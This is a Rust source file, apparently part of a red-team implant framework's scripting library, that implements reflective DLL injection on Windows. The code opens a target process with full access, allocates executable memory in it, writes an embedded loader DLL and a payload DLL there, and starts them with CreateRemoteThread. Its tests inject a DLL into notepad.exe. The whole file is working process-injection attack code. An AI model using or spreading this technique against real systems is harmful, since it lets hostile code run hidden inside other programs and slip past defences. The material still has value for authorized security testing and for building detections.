use std::path::PathBuf;

use starlark::values::none::NoneType;

#[cfg(target_os = "windows")]
use {
    object::LittleEndian as LE,
    object::{Object, ObjectSection},
    std::{os::raw::c_void, ptr::null_mut},
    windows_sys::Win32::Security::SECURITY_ATTRIBUTES,
    windows_sys::Win32::System::Threading::CreateRemoteThread,
    windows_sys::Win32::{
        Foundation::{GetLastError, BOOL, FALSE, HANDLE},
        System::{
            Diagnostics::Debug::WriteProcessMemory,
            Memory::{
                VirtualAllocEx, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE,
                PAGE_PROTECTION_FLAGS, VIRTUAL_ALLOCATION_TYPE,
            },
            Threading::{OpenProcess, PROCESS_ACCESS_RIGHTS, PROCESS_ALL_ACCESS},
        },
    },
};

#[cfg(not(windows))]
macro_rules! sep {
    () => {
        "/"
    };
}

#[cfg(windows)]
macro_rules! sep {
    () => {
        r#"\"#
    };
}

#[cfg(target_os = "windows")]
const LOADER_BYTES: &[u8] = include_bytes!(concat!(
    "..",
    sep!(),
    "..",
    sep!(),
    "..",
    sep!(),
    "..",
    sep!(),
    "..",
    sep!(),
    "bin",
    sep!(),
    "reflective_loader",
    sep!(),
    "target",
    sep!(),
    "x86_64-pc-windows-msvc",
    sep!(),
    "release",
    sep!(),
    "reflective_loader.dll"
));
// const LOADER_BYTES: &[u8] = include_bytes!("../../../../../bin/reflective_loader/target/x86_64-pc-windows-gnu/release/reflective_loader.dll");

#[cfg(target_os = "windows")]
fn get_u8_vec_form_u32_vec(u32_vec: Vec<u32>) -> anyhow::Result<Vec<u8>> {
    let mut should_err = false;
    let res_u8_vec: Vec<u8> = u32_vec
        .iter()
        .map(|x| {
            if *x <= u8::MAX as u32 {
                *x as u8
            } else {
                should_err = true;
                u8::MAX
            }
        })
        .collect();
    if should_err {
        return Err(anyhow::anyhow!(
            "Error casting eldritch number to u8. Number was too big."
        ));
    }
    Ok(res_u8_vec)
}

#[cfg(target_os = "windows")]
// pub unsafe fn OpenProcess(dwdesiredaccess: PROCESS_ACCESS_RIGHTS, binherithandle: super::super::Foundation::BOOL, dwprocessid: u32) -> super::super::Foundation::HANDLE
fn open_process(
    dwdesiredaccess: PROCESS_ACCESS_RIGHTS,
    binherithandle: BOOL,
    dwprocessid: u32,
) -> anyhow::Result<HANDLE> {
    let process_handle: HANDLE =
        unsafe { OpenProcess(dwdesiredaccess, binherithandle, dwprocessid) };
    if process_handle == 0 {
        let error_code = unsafe { GetLastError() };
        if error_code != 0 {
            return Err(anyhow::anyhow!(
                "Failed to open process {}. Last error returned: {}",
                dwprocessid,
                error_code
            ));
        }
    }
    Ok(process_handle)
}

#[cfg(target_os = "windows")]
// pub unsafe fn VirtualAllocEx(hprocess: super::super::Foundation::HANDLE, lpaddress: *const ::core::ffi::c_void, dwsize: usize, flallocationtype: VIRTUAL_ALLOCATION_TYPE, flprotect: PAGE_PROTECTION_FLAGS) -> *mut ::core::ffi::c_void
fn virtual_alloc_ex(
    hprocess: HANDLE,
    lpaddress: *const c_void,
    dwsize: usize,
    flallocationtype: VIRTUAL_ALLOCATION_TYPE,
    flprotect: PAGE_PROTECTION_FLAGS,
) -> anyhow::Result<*mut c_void> {
    let buffer_handle: *mut c_void =
        unsafe { VirtualAllocEx(hprocess, lpaddress, dwsize, flallocationtype, flprotect) };
    if buffer_handle == null_mut() {
        let error_code = unsafe { GetLastError() };
        if error_code != 0 {
            return Err(anyhow::anyhow!(
                "Failed to allocate memory. Last error returned: {}",
                error_code
            ));
        }
    }
    Ok(buffer_handle)
}

#[cfg(target_os = "windows")]
// pub unsafe fn WriteProcessMemory(hprocess: super::super::super::Foundation::HANDLE, lpbaseaddress: *const ::core::ffi::c_void, lpbuffer: *const ::core::ffi::c_void, nsize: usize, lpnumberofbyteswritten: *mut usize) -> super::super::super::Foundation::BOOL
fn write_process_memory(
    hprocess: HANDLE,
    lpbaseaddress: *const c_void,
    lpbuffer: *const c_void,
    nsize: usize,
) -> anyhow::Result<usize> {
    let mut lpnumberofbyteswritten: usize = 0;
    let write_res = unsafe {
        WriteProcessMemory(
            hprocess,
            lpbaseaddress,
            lpbuffer,
            nsize,
            &mut lpnumberofbyteswritten,
        )
    };
    if write_res == FALSE || lpnumberofbyteswritten == 0 {
        let error_code = unsafe { GetLastError() };
        if error_code != 0 {
            return Err(anyhow::anyhow!(
                "Failed to write process memory. Last error returned: {}",
                error_code
            ));
        }
    }
    Ok(lpnumberofbyteswritten)
}

#[cfg(target_os = "windows")]
// fn CreateRemoteThread(hprocess: isize, lpthreadattributes: *const SECURITY_ATTRIBUTES, dwstacksize: usize, lpstartaddress: Option<fn(*mut c_void) -> u32>, lpparameter: *const c_void, dwcreationflags: u32, lpthreadid: *mut u32) -> isize
fn create_remote_thread(
    hprocess: isize,
    lpthreadattributes: *const SECURITY_ATTRIBUTES,
    dwstacksize: usize,
    lpstartaddress: Option<*mut c_void>,
    lpparameter: *const c_void,
    dwcreationflags: u32,
    lpthreadid: *mut u32,
) -> anyhow::Result<isize> {
    let tmp_lpstartaddress: Option<unsafe extern "system" fn(_) -> _> = match lpstartaddress {
        Some(local_lpstartaddress) => Some(unsafe { std::mem::transmute(local_lpstartaddress) }),
        None => todo!(),
    };
    let res = unsafe {
        CreateRemoteThread(
            hprocess,
            lpthreadattributes,
            dwstacksize,
            tmp_lpstartaddress,
            lpparameter,
            dwcreationflags,
            lpthreadid,
        )
    };
    if res == 0 {
        let error_code = unsafe { GetLastError() };
        if error_code != 0 {
            return Err(anyhow::anyhow!(
                "Failed to create remote thread. Last error returned: {}",
                error_code
            ));
        }
    }
    Ok(res)
}
#[cfg(target_os = "windows")]
fn get_export_address_by_name(
    pe_bytes: &[u8],
    export_name: &str,
    in_memory: bool,
) -> anyhow::Result<usize> {
    let pe_file = object::read::pe::PeFile64::parse(pe_bytes)?;

    let section = match pe_file.section_by_name(".text") {
        Some(local_section) => local_section,
        None => return Err(anyhow::anyhow!(".text section not found")),
    };

    let mut section_raw_data_ptr = 0x0;
    for section in pe_file.section_table().iter() {
        let section_name = String::from_utf8(section.name.to_vec())?;
        if section_name.contains(".text") {
            section_raw_data_ptr = section.pointer_to_raw_data.get(LE);
            break;
        }
    }
    if section_raw_data_ptr == 0x0 {
        return Err(anyhow::anyhow!("Failed to find pointer to text section."));
    }

    // Section offset for .text.
    let rva_offset = section.address() as usize
        - section_raw_data_ptr as usize
        - pe_file.relative_address_base() as usize;

    let exported_functions = pe_file.exports()?;
    for export in exported_functions {
        if export_name == String::from_utf8(export.name().to_vec())?.as_str() {
            if in_memory {
                return Ok(export.address() as usize - pe_file.relative_address_base() as usize);
            } else {
                return Ok(export.address() as usize
                    - rva_offset
                    - pe_file.relative_address_base() as usize);
            }
        }
    }

    Err(anyhow::anyhow!("Function {} not found", export_name))
}

#[cfg(target_os = "windows")]
struct UserData {
    function_offset: u64,
}

#[cfg(target_os = "windows")]
fn handle_dll_reflect(
    target_dll_bytes: Vec<u8>,
    pid: u32,
    function_name: &str,
) -> anyhow::Result<()> {
    let loader_function_name = "reflective_loader";
    let reflective_loader_dll = LOADER_BYTES;

    let target_function = get_export_address_by_name(&target_dll_bytes, function_name, true)?;
    let user_data = UserData {
        function_offset: target_function as u64,
    };

    // let dos_header = reflective_loader_dll.as_ptr() as *mut IMAGE_DOS_HEADER;
    // let nt_header = (reflective_loader_dll.as_ptr() as usize + (unsafe { *dos_header }).e_lfanew as usize) as *mut IMAGE_NT_HEADERS64;
    let image_size = reflective_loader_dll.len();

    let process_handle = open_process(PROCESS_ALL_ACCESS, 0, pid)?;

    // Allocate and write loader to remote process
    let remote_buffer = virtual_alloc_ex(
        process_handle,
        null_mut(),
        image_size as usize,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE,
    )?;

    let _loader_bytes_written = write_process_memory(
        process_handle,
        remote_buffer as _,
        reflective_loader_dll.as_ptr() as _,
        image_size as usize,
    )?;

    // Allocate and write user data to the remote process
    let remote_buffer_user_data: *mut std::ffi::c_void = virtual_alloc_ex(
        process_handle,
        null_mut(),
        std::mem::size_of::<UserData>(),
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE,
    )?;

    let user_data_ptr: *const UserData = &user_data as *const UserData;
    let _user_data_bytes_written = write_process_memory(
        process_handle,
        remote_buffer_user_data as _,
        user_data_ptr as *const _,
        std::mem::size_of::<UserData>(),
    )?;

    // Allocate and write function offset + payload to remote process
    let user_data_ptr_size = std::mem::size_of::<u64>();
    let remote_buffer_target_dll: *mut std::ffi::c_void = virtual_alloc_ex(
        process_handle,
        null_mut(),
        user_data_ptr_size + target_dll_bytes.len() as usize,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE,
    )?;

    // Write user data ptr to start of param.
    let user_data_ptr_as_bytes = (remote_buffer_user_data as usize).to_le_bytes(); // The address in a slice little endian. Eg. 0xff01 = [01, ff]
    let user_data_ptr_in_remote_buffer = remote_buffer_target_dll as usize;
    let _payload_bytes_written = write_process_memory(
        process_handle,
        user_data_ptr_in_remote_buffer as _,
        user_data_ptr_as_bytes.as_slice().as_ptr() as *const _,
        user_data_ptr_size,
    )?;

    // Write dll_bytes at buffer + size of pointer to user data (should be usize)
    let payload_ptr_in_remote_buffer = remote_buffer_target_dll as usize + user_data_ptr_size;
    let _payload_bytes_written = write_process_memory(
        process_handle,
        payload_ptr_in_remote_buffer as _,
        target_dll_bytes.as_slice().as_ptr() as _,
        target_dll_bytes.len() as usize,
    )?;

    // Find the loader entrypoint and hand off execution
    let loader_address_offset =
        get_export_address_by_name(reflective_loader_dll, loader_function_name, false)?;
    let loader_address = loader_address_offset + remote_buffer as usize;

    let _thread_handle = create_remote_thread(
        process_handle,
        null_mut(),
        0,
        Some(loader_address as *mut c_void),
        remote_buffer_target_dll,
        0,
        null_mut(),
    )?;

    Ok(())
}

#[cfg(not(target_os = "windows"))]
pub fn dll_reflect(
    _dll_bytes: Vec<u32>,
    _pid: u32,
    _function_name: String,
) -> anyhow::Result<NoneType> {
    return Err(anyhow::anyhow!(
        "This OS isn't supported by the dll_reflect function.\nOnly windows systems are supported"
    ));
}

#[cfg(target_os = "windows")]
pub fn dll_reflect(
    dll_bytes: Vec<u32>,
    pid: u32,
    function_name: String,
) -> anyhow::Result<NoneType> {
    let local_dll_bytes = get_u8_vec_form_u32_vec(dll_bytes)?;
    handle_dll_reflect(local_dll_bytes, pid, function_name.as_str())?;
    Ok(NoneType)
}

#[cfg(not(target_os = "windows"))]
mod tests {
    #[test]
    fn test_dll_reflect_non_windows_test() -> anyhow::Result<()> {
        let res = super::dll_reflect(Vec::new(), 0, "Garbage".to_string());
        match res {
            Ok(_none_type) => return Err(anyhow::anyhow!("dll_reflect should have errored out.")),
            Err(local_err) => assert!(local_err
                .to_string()
                .contains("This OS isn't supported by the dll_reflect")),
        }
        Ok(())
    }
}

#[cfg(target_os = "windows")]
#[cfg(test)]
mod tests {
    use super::*;

    use starlark::{
        collections::SmallMap,
        environment::{GlobalsBuilder, Module},
        eval::Evaluator,
        starlark_module,
        syntax::{AstModule, Dialect},
        values::{dict::Dict, AllocValue, Value},
    };
    use std::{fs, path::Path, process::Command, thread, time};
    use sysinfo::{Pid, PidExt, ProcessExt, Signal, System, SystemExt};
    use tempfile::NamedTempFile;

    #[cfg(target_os = "windows")]
    const TEST_DLL_BYTES: &[u8] = include_bytes!(
        "..\\..\\..\\..\\..\\bin\\create_file_dll\\target\\debug\\create_file_dll.dll"
    );

    #[test]
    fn test_dll_reflect_get_u8_vec_form_u32_vec_simple() -> anyhow::Result<()> {
        let test_input: Vec<u32> = vec![0, 2, 15];
        let expected_output: Vec<u8> = vec![0, 2, 15];
        let res = get_u8_vec_form_u32_vec(test_input)?;
        assert_eq!(res, expected_output);
        Ok(())
    }

    #[test]
    fn test_dll_reflect_get_u8_vec_form_u32_vec_fail() -> anyhow::Result<()> {
        let test_input: Vec<u32> = vec![0, 2, 16];
        let err_str = match get_u8_vec_form_u32_vec(test_input) {
            Ok(_) => "No error".to_string(),
            Err(local_err) => local_err.to_string(),
        };
        assert_eq!("No error".to_string(), err_str);
        Ok(())
    }

    #[test]
    fn test_dll_reflect_get_export_address_by_name_on_disk() -> anyhow::Result<()> {
        let test_dll_bytes = LOADER_BYTES;
        let loader_address_offset: usize =
            get_export_address_by_name(test_dll_bytes, "reflective_loader", false)?;
        assert!(loader_address_offset < 0xF000); // Best guess :shrug: - offset can change every build.
        Ok(())
    }

    #[test]
    fn test_dll_reflect_get_export_address_by_name_in_memory() -> anyhow::Result<()> {
        let test_dll_bytes = TEST_DLL_BYTES;
        let loader_address_offset: usize =
            get_export_address_by_name(test_dll_bytes, "demo_init", true)?;
        assert!(loader_address_offset < 0xF000); // Best guess :shrug: - offset can change every build.
        Ok(())
    }
    #[test]
    fn test_dll_reflect_loader_portability() -> anyhow::Result<()> {
        let pe_file = object::read::pe::PeFile64::parse(LOADER_BYTES)?;
        // Make sure the loader doesn't have a relocations section.
        for section in pe_file.section_table().iter() {
            let section_name = String::from_utf8(section.name.to_vec())?;
            assert!(!section_name.contains(".reloc"));
        }
        // Make sure the loadre doesn't have any imports.
        assert_eq!(pe_file.imports()?.len(), 0);
        Ok(())
    }

    #[test]
    fn test_dll_reflect_simple() -> anyhow::Result<()> {
        let test_dll_bytes = TEST_DLL_BYTES;
        const DLL_EXEC_WAIT_TIME: u64 = 5;

        // Get unique and unused temp file path
        let tmp_file = NamedTempFile::new()?;
        let path = String::from(tmp_file.path().to_str().unwrap()).clone();
        tmp_file.close()?;

        // Out target process is notepad for stability and control.
        // The temp file is passed through an environment variable.
        let expected_process = Command::new("C:\\Windows\\System32\\notepad.exe")
            .env("LIBTESTFILE", path.clone())
            .spawn();
        let target_pid = expected_process.unwrap().id();

        // Run our code.
        let _res = handle_dll_reflect(test_dll_bytes.to_vec(), target_pid, "demo_init")?;

        let delay = time::Duration::from_secs(DLL_EXEC_WAIT_TIME);
        thread::sleep(delay);

        // Test that the test file was created
        let test_path = Path::new(path.as_str());
        assert!(test_path.is_file());

        // Delete test file
        let _ = fs::remove_file(test_path);

        // kill the target process notepad
        let mut sys = System::new();
        sys.refresh_processes();
        match sys.process(Pid::from_u32(target_pid)) {
            Some(res) => {
                res.kill_with(Signal::Kill);
            }
            None => {}
        }
        Ok(())
    }

    #[test]
    fn test_dll_reflect_starlark() -> anyhow::Result<()> {
        const DLL_EXEC_WAIT_TIME: u64 = 5;
        // Get unique and unused temp file path
        let tmp_file = NamedTempFile::new()?;
        let path = String::from(tmp_file.path().to_str().unwrap()).clone();
        tmp_file.close()?;

        let test_dll_bytes = TEST_DLL_BYTES;

        let expected_process = Command::new("C:\\Windows\\System32\\notepad.exe")
            .env("LIBTESTFILE", path.clone())
            .spawn();
        let target_pid = expected_process.unwrap().id() as i32;

        let test_eldritch_script = format!(
            r#"
func_dll_reflect(input_params['dll_bytes'], input_params['target_pid'], "demo_init")
"#
        );

        let ast: AstModule;
        match AstModule::parse(
            "test.eldritch",
            test_eldritch_script.to_owned(),
            &Dialect::Standard,
        ) {
            Ok(res) => ast = res,
            Err(err) => return Err(err),
        }

        #[starlark_module]
        fn func_dll_reflect(builder: &mut GlobalsBuilder) {
            fn func_dll_reflect(
                dll_bytes: Vec<u32>,
                pid: u32,
                function_name: String,
            ) -> anyhow::Result<NoneType> {
                dll_reflect(dll_bytes, pid, function_name)
            }
        }

        let globals = GlobalsBuilder::standard().with(func_dll_reflect).build();
        let module: Module = Module::new();

        let res: SmallMap<Value, Value> = SmallMap::new();
        let mut input_params: Dict = Dict::new(res);
        let target_pid_key = module
            .heap()
            .alloc_str("target_pid")
            .to_value()
            .get_hashed()?;
        let target_pid_value = module.heap().alloc(target_pid);
        input_params.insert_hashed(target_pid_key, target_pid_value);

        let dll_bytes_key = module
            .heap()
            .alloc_str("dll_bytes")
            .to_value()
            .get_hashed()?;
        let mut tmp_list: Vec<Value> = Vec::new();
        for byte in test_dll_bytes {
            tmp_list.push(module.heap().alloc(*byte as i32));
        }
        let dll_bytes_value = module.heap().alloc(tmp_list);
        input_params.insert_hashed(dll_bytes_key, dll_bytes_value);

        module.set("input_params", input_params.alloc_value(module.heap()));

        let mut eval: Evaluator = Evaluator::new(&module);
        let res: Value = eval.eval_module(ast, &globals).unwrap();
        let _res_string = res.to_string();

        let delay = time::Duration::from_secs(DLL_EXEC_WAIT_TIME);
        thread::sleep(delay);

        let test_path = Path::new(path.as_str());
        assert!(test_path.is_file());

        // Delete test file
        let _ = fs::remove_file(test_path);

        // kill the target process notepad
        let mut sys = System::new();
        sys.refresh_processes();
        match sys.process(Pid::from_u32(target_pid as u32)) {
            Some(res) => {
                res.kill_with(Signal::Kill);
            }
            None => {}
        }
        Ok(())
    }
}
